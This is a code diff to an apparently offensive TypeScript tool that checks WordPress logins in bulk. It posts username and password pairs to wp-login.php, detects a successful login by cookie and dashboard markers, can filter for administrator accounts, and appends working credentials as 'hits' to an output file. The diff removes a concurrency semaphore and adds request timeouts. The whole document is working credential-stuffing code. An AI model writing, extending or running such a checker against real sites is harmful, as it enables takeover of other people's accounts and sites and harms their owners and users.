@@ -11,7 +11,6 @@ import { IWordpress, LogEntry } from './interfaces/wp.interfaces';
 import blessed from 'blessed';
 import yargs from 'yargs';
 import { hideBin } from 'yargs/helpers';
-import semaphore from 'semaphore';
 import ncu from 'npm-check-updates';
 
 async function checkForUpdates() {
@@ -117,16 +116,14 @@ class Wordpress implements IWordpress {
     public start: number;
     public logBuffer: LogEntry[];
     private client: any;
-    private sem: any;
 
-    constructor(concurrency: number) {
+    constructor() {
         this.hits = 0;
         this.bad = 0;
         this.cpm = 0;
         this.start = Date.now();
         this.logBuffer = [];
         this.client = wrapper(axios.create({ jar: new CookieJar() }));
-        this.sem = semaphore(concurrency);
         this.updateTitle();
         this.calculateCpm();
     }
@@ -168,86 +165,85 @@ class Wordpress implements IWordpress {
     }
 
     async checkAccount(url: string, username: string, password: string): Promise<void> {
-        this.sem.take(async () => {
-            try {
-                const payload = new URLSearchParams({
-                    'log': username,
-                    'pwd': password,
-                    'wp-submit': 'Log In',
-                    'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
-                    'testcookie': '1'
-                });
+        try {
+            const payload = new URLSearchParams({
+                'log': username,
+                'pwd': password,
+                'wp-submit': 'Log In',
+                'redirect_to': url.replace('wp-login.php', 'wp-admin/'),
+                'testcookie': '1'
+            });
 
-                const headers = {
-                    'User-Agent': 'Mozilla/5.0',
-                    'Referer': url
-                };
+            const headers = {
+                'User-Agent': 'Mozilla/5.0',
+                'Referer': url
+            };
 
-                if (!/^https?:\/\//i.test(url)) {
-                    url = 'https://' + url;
+            if (!/^https?:\/\//i.test(url)) {
+                url = 'https://' + url;
+            }
+
+            const response = await this.client.post(url, payload.toString(), {
+                headers,
+                maxRedirects: 0,
+                timeout: 10000, // 10 seconds timeout
+                validateStatus: (status) => status === 302 || status === 200,
+                withCredentials: true
+            });
+
+            const cookies = response.headers['set-cookie'];
+            if (debugMode) {
+                console.log('Response headers:', response.headers);
+            }
+
+            if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
+                const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
+                const cookieHeader = cookies.join('; ');
+
+                if (debugMode) {
+                    console.log('Attempting to access dashboard URL:', dashboardUrl);
                 }
 
-                const response = await this.client.post(url, payload.toString(), {
-                    headers,
-                    maxRedirects: 0,
-                    validateStatus: (status) => status === 302 || status === 200,
+                const r = await this.client.get(dashboardUrl, {
+                    headers: {
+                        ...headers,
+                        'Cookie': cookieHeader
+                    },
+                    timeout: 10000, // 10 seconds timeout
                     withCredentials: true
                 });
 
-                const cookies = response.headers['set-cookie'];
                 if (debugMode) {
-                    console.log('Response headers:', response.headers);
+                    console.log('Final response data:', r.data);
                 }
 
-                if (cookies && cookies.some(cookie => cookie.startsWith('wordpress_logged_in'))) {
-                    const dashboardUrl = url.replace('wp-login.php', 'wp-admin/');
-                    const cookieHeader = cookies.join('; ');
+                let isAdmin = true;
 
-                    if (debugMode) {
-                        console.log('Attempting to access dashboard URL:', dashboardUrl);
-                    }
+                if (adminOnly) {
+                    isAdmin = r.data.includes("plugin-install.php");
+                }
 
-                    const r = await this.client.get(dashboardUrl, {
-                        headers: {
-                            ...headers,
-                            'Cookie': cookieHeader
-                        },
-                        withCredentials: true
-                    });
-
-                    if (debugMode) {
-                        console.log('Final response data:', r.data);
-                    }
-
-                    let isAdmin = true;
-
-                    if (adminOnly) {
-                        isAdmin = r.data.includes("plugin-install.php");
-                    }
-
-                    if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
-                        this.hits += 1;
-                        this.logBuffer.push({ type: 'HIT', url, username, password });
-                        fs.writeFileSync(outputFile, `${url} - ${username}|${password}\n`, { flag: 'a' });
-                    } else {
-                        this.bad += 1;
-                        this.logBuffer.push({ type: 'BAD', url, username, password });
-                    }
+                if (isAdmin && (r.data.includes('dashicons-admin-plugins') || r.data.includes('wp-admin-bar'))) {
+                    this.hits += 1;
+                    this.logBuffer.push({ type: 'HIT', url, username, password });
+                    fs.writeFileSync(outputFile, `${url} - ${username}|${password}\n`, { flag: 'a' });
                 } else {
                     this.bad += 1;
                     this.logBuffer.push({ type: 'BAD', url, username, password });
                 }
-            } catch (error) {
-                if (debugMode) {
-                    console.error(`Error checking account ${username}@${url}:`, error);
-                }
+            } else {
                 this.bad += 1;
                 this.logBuffer.push({ type: 'BAD', url, username, password });
-            } finally {
-                this.displayUI();
-                this.sem.leave();
             }
-        });
+        } catch (error) {
+            if (debugMode) {
+                console.error(`Error checking account ${username}@${url}:`, error);
+            }
+            this.bad += 1;
+            this.logBuffer.push({ type: 'BAD', url, username, password });
+        } finally {
+            this.displayUI();
+        }
     }
 }
 
@@ -289,7 +285,7 @@ function showLoadingScreen(): Promise<void> {
             clearInterval(loadingInterval);
             screen.remove(loadingBox);
             resolve();
-        }, 5000); // Simulate a 5-second loading time
+        }, 5000); 
     });
 }
 
@@ -308,11 +304,10 @@ function readAccounts(filename: string, wp: Wordpress): void {
     });
 
     rl.on('close', () => {
-       
     });
 }
 
-const wp = new Wordpress(concurrency);
+const wp = new Wordpress();
 
 showLoadingScreen().then(() => {
     wp.displayUI();
